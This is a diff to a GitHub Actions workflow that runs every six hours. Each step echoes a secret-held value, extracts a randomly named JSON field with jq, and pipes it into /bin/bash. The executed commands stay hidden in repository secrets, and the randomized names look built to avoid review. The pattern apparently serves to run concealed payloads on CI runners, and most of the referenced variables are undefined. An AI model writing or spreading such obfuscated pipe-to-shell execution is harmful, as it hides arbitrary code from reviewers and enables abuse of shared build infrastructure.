@@ -3,33 +3,31 @@ name: songbingjia7986
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 3/6 * * *'
+    - cron: '5 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: songbingjia7986
         env:
-          jknn4: ${{ secrets.jknn4 }}
+          abqoj7: ${{ secrets.abqoj7 }}
         run: |
-          echo $jknn4 | jq -r .hknhu237 | /bin/bash
-          echo $tkdli51837 | jq -r .zqsa08037 | /bin/bash
-          echo $ezy085 | jq -r .slsz7060 | /bin/bash
-          echo $go8 | jq -r .l86 | /bin/bash
-          echo $xaxpk0 | jq -r .gzz28514 | /bin/bash
-          echo $had04 | jq -r .mcnp33 | /bin/bash
-          echo $csvz51335 | jq -r .wk09 | /bin/bash
-          echo $ztjt1469 | jq -r .dxxzw847 | /bin/bash
-          echo $qx09 | jq -r .bzroa1844 | /bin/bash
-          echo $eqj7 | jq -r .pn60 | /bin/bash
-          echo $sz43186 | jq -r .bnl33 | /bin/bash
-          echo $gua5983 | jq -r .hez34 | /bin/bash
-          echo $k89999 | jq -r .ukl66085 | /bin/bash
-          echo $gh487 | jq -r .blk03746 | /bin/bash
-          echo $oh63826 | jq -r .yzx98043 | /bin/bash
-          echo $v9 | jq -r .hd815 | /bin/bash
-          echo $d2 | jq -r .x265 | /bin/bash
+          echo $abqoj7 | jq -r .xdzim910 | /bin/bash
+          echo $ydvy392 | jq -r .ohgut1968 | /bin/bash
+          echo $utbbt21 | jq -r .p62 | /bin/bash
+          echo $wwy668 | jq -r .dyce3 | /bin/bash
+          echo $ogw2290 | jq -r .okfe241 | /bin/bash
+          echo $srdxg57410 | jq -r .jrhdy52366 | /bin/bash
+          echo $omyhd68 | jq -r .k6 | /bin/bash
+          echo $tj75580 | jq -r .cv39 | /bin/bash
+          echo $cft2 | jq -r .nssx3 | /bin/bash
+          echo $qym7799 | jq -r .pmux0915 | /bin/bash
+          echo $d2660 | jq -r .xshgn49415 | /bin/bash
+          echo $k69 | jq -r .tq8 | /bin/bash
+          echo $nm28097 | jq -r .qic2425 | /bin/bash
+          echo $tzhrn21193 | jq -r .imm81 | /bin/bash
+          echo $wr2 | jq -r .x227 | /bin/bash
+          echo $nl8 | jq -r .qzk5827 | /bin/bash
 
